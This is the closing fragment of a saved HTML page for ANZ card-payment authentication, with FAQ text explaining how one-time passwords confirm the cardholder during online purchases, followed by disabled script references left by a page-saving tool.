                                        When you correctly enter the one-time password, your card issuer confirms that you are the authorised cardholder and your purchase continues. If the one-time password entered is incorrect, the
                                        purchase will not go through. So even if someone else knew your card number, without the correct one-time password they would not be able to use your account at that merchant.<br />
                                        <br />
                                        <strong>How will authentication impact my purchase?</strong><br />
                                        Your purchase is not impacted, except for the fact that you need to enter your one-time password when the request box pops up and wait a few seconds while your card issuer (ANZ) confirms your
                                        identity.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script data-savepage-type="" type="text/plain" data-savepage-src="/Content/dist/js/runtime~template.337c7dade802f198b9ea.js"></script>

        <script data-savepage-type="" type="text/plain" data-savepage-src="/Content/dist/js/template.b734ec1e49baf6041b75.js"></script>

        <script data-savepage-type="" type="text/plain" data-savepage-src="/Content/dist/js/validate.00bddd114c780297b77d.js"></script>
    </body>
</html>
